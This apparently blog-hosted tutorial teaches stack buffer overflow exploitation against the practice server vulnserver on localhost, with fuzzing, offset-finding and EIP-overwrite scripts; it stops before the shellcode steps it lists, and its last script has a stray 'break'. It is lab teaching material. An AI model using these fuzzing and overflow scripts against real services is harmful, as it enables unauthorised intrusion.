---
title: "Pentest Quick Cheatsheet"
excerpt_separator: "<!--more-->"
author_profile: false
categories:
  - bufferoverflow
tags:
  - learning
  - pentest
  - hacking
  - guide
---

# Buffer Overflow Tutorial 
> Basic EIP Bypass (vulnserver.exe)(Windows version)    
> Credits to Stephen Bradshaw: https://github.com/stephenbradshaw/vulnserver

### Description
Buffer overflow is probably the best known form of software security vulnerability. Most software developers know what a buffer overflow vulnerability is, but buffer overflow attacks against both legacy and newly-developed applications are still quite common. Part of the problem is due to the wide variety of ways buffer overflows can occur, and part is due to the error-prone techniques often used to prevent them.
Buffer overflows are not easy to discover and even when one is discovered, it is generally extremely difficult to exploit. Nevertheless, attackers have managed to identify buffer overflows in a staggering array of products and components.
In a classic buffer overflow exploit, the attacker sends data to a program, which it stores in an undersized stack buffer. The result is that information on the call stack is overwritten, including the function’s return pointer. The data sets the value of the return pointer so that when the function returns, it transfers control to malicious code contained in the attacker’s data.
Although this type of stack buffer overflow is still common on some platforms and in some development communities, there are a variety of other types of buffer overflow, including Heap buffer overflow and Off-by-one Error among others. Another very similar class of flaws is known as Format string attack. There are a number of excellent books that provide detailed information on how buffer overflow attacks work, including Building Secure Software [1], Writing Secure Code [2], and The Shellcoder’s Handbook [3].
At the code level, buffer overflow vulnerabilities usually involve the violation of a programmer’s assumptions. Many memory manipulation functions in C and C++ do not perform bounds checking and can easily overwrite the allocated bounds of the buffers they operate upon. Even bounded functions, such as strncpy(), can cause vulnerabilities when used incorrectly. The combination of memory manipulation and mistaken assumptions about the size or makeup of a piece of data is the root cause of most buffer overflows.
Buffer overflow vulnerabilities typically occur in code that:
• Relies on external data to control its behavior
• Depends upon properties of the data that are enforced outside of the immediate scope of the code
• Is so complex that a programmer cannot accurately predict its behavior


## Required Tools or Files
* [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py) for Windows  (you can fill out fake info for downloading)
- [Python](https://www.python.org/downloads/) (Code editor and compiler)
- [Visual Studio](https://visualstudio.microsoft.com/) (Code editor)
* [Mona.py](https://github.com/corelan/mona) (Mona module for Immunity debugger)

## Sections
* [Setup](#setup)
* [Spiking](#spiking)
* [Fuzzing](#fuzzing)
* [Finding the Offset](#finding-the-offset)
* Overwrighting the EIP
* Finding bad charaters
* Finding the right module
* Generating the shell code

## Setup
**Vulnserver**     
* Download vulnserver and the 'essfunc.dll' (make sure they are together in a folder)
* Connecting. Run 'vulnserver.exe' then you can connect with netcat
Run
```console
vulnserver.exe 9999
```
or vulnserver 666 (to use port 666)

Connect
```console
nc 127.0.0.1 9999
```
127.0.0.1 (localhost) on port 9999


**Immunity Debugger**    
* Downlaod and install Immunity debugger, then run once and close.
* Install Python 2.7.14 (or a higher 2.7.xx version) into c:\python27, thus overwriting the version that was bundled with Immunity. This is needed to avoid TLS issues when trying to update mona. Make sure you are installing the 32bit version of python. 

**Mona.py**    
* Download Mona.py and place the Mona.py file in 'PyCommands' folder (inside the Immunity Debugger application folder).


## Spiking
Spiking is the art of finding a vunerable command withint the applicaion you are attacking. For this example we know that the "TRUN" command is vunerable. 

The vulnerable service command is "TRUN," but in reality, you will likely have to use the script (generic_send_tcp) on multiple commands until the program breaks. 
If you do NOT see any commands to test, proceed to the FAQ at the end of this README.md file.
Run Immunity as Admin.
Run the executable you found. (or downloaded for practice)
Attach to the executable process.
Click the "Play" button in Immunity, ensure it says Running on the bottom right-hand corner.
Use the provided command file

```console
s_readline();
s_string("STATS ");
s_string_variable("0");
```

ensuring that you edit the 'STATS' command with whatever command you're attempting to test ('TRUN' in our case). 

```console
generic_send_tcp IP port command.spk 0 0
```

After you utilize the command.spk, look to see if there's an Access Violation in Immunity, if there is not, edit the command within the command.spk to a different one and retest. 

## Fuzzing
Fuzzing is to test the application is veunerable on the found exploitable input (We need to send enough data to crash the application)

fuzz.py Script

```python
#!/usr/bin/python
from __future__ import print_function
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('127.0.0.1',9999))

                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print("Fuzzing crashed at %s bytes" % str(len(buffer)))
```

Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port, and command you want to test.
Restart Immunity debugger + the Exe and attach as you did previously.
Run the script 

```console
python fuzz.py
```

Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity.
Doing so will ensure you can more accurately estimate the bytes it took to crash it.
Write down the number of bytes it took to crash the program. (My test showed: 2118 byte length)


## Finding the Offset
The correct identification of the offset will help ensure that the Shellcode you generate will not immediately crash the program.

1. Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program.

```console
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

2. Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
Closeout Immunity + the executable program.
3. Repeat the process of relaunching Immunity and attaching to the executable program.

Run the script

```python
#!/usr/bin/python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('127.0.0.1',9999))
       s.recv(1024)
       s.send(('TRUN /.:/' + offset + '\r\n').encode())
       s.close()
       print("[+] Poc sent")

except Exception as e:
       print(e)
       print("Error connecting to server")
       sys.exit()
```

```console
python offset.py
```

4. Go into Immunity and look for a number written in the EIP space.

![Eip value](/assets/images/EIP.png)

5. If there is no number written into the EIP space, the number of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
6. When you find a number written to the EIP, write this number down somewhere. (EIP: 386F4337)
Use the following command, replacing the -l switch value with your identified fuzz-bytes number from step 1, and replace the -q switch with the number that is written to the EIP. 
```console
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```
If everything is correct, when you run the above command, you should get an exact offset match that looks like this:

![](/assets/images/offset.png)

Ensure that you write down this offset match.

## Overwriting the Offset
This step will help you ensure that you can control the EIP. If you are successful, you will observe 4 "B" characters within the EIP space(42424242, 42 = B hexidecimal) (Based off of the script code)
1. Restart Immunity + the Exe and attach as you did previously.
2. Edit the provided python script to test your offset

```python
import socket
from time import sleep

ip = "127.0.0.1"
port = 9999

fuzzBuffer = "A"
buffer = ""
command = "TRUN /.:/"

print(f"[*] Connecting to {ip,port}")

buffer = command    
buffer += fuzzBuffer * 2003 + "B" * 4 + "C" * 100 + '\r\n'

print(f"Sending payload, Buffer len: {len(buffer)}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    conn = s.connect((ip, port))
    recv = s.recv(1024)
    s.send(buffer.encode("latin-1"))
except:
    s.close()
    print(f"Program Crashed Buffer Length: {len(buffer)}")
    break
```

3. Replace "2003" with your offset value found, replace the IP, port, and command with your values (as needed).
4. Run the script
```console
python offset.py
```

5. You should now observe 4 "B characters" represented by 42424242 written to the EIP.

![](/assets/images/EIP2.PNG)

6. You now control the EIP. Good job!

